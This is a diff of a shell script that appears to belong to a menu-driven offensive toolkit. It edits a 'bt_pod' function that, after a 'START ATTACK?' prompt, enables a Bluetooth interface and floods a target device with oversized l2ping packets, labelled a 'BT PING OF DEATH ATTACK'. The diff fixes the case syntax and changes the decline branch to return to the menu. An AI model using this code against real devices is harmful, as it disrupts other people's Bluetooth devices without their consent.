@@ -922,19 +922,17 @@ bt_pod()
     read -p "START ATTACK? (y/n): " logs
     case $logs in
         [yY][eE][sS]|[yY])
-    read -p "INTERFACE: " device
-    printf "$inf STARTING BT PING OF DEATH ATTACK...\n"
-    hciconfig $device up
-    l2ping -i $device -s 600 -f $target 
-    printf "$inf "
-    read -p "press [ENTER] to back" variable
-    auramenu
-        [nN][oO]|[nN])
-            printf "$inf STARTING SCAN...\e[0m\n"
+            read -p "INTERFACE: " device
+            printf "$inf STARTING BT PING OF DEATH ATTACK...\n"
             hciconfig $device up
-            while [ 1 ]; do hcitool scan;printf "$inf RETRYING... HIT CTRL+C TO KILL\e[0m\n";done
+            l2ping -i $device -s 600 -f $target 
             printf "$inf "
-            read -p "PRESS [ENTER] TO BACK" variable
+            read -p "press [ENTER] to back" variable
+            auramenu
+            ;;
+        [nN][oO]|[nN])
+            printf "$inf BACKING TO MENU..."
+            sleep 1.2
             auramenu
             ;;
         *) printf "$red";exit
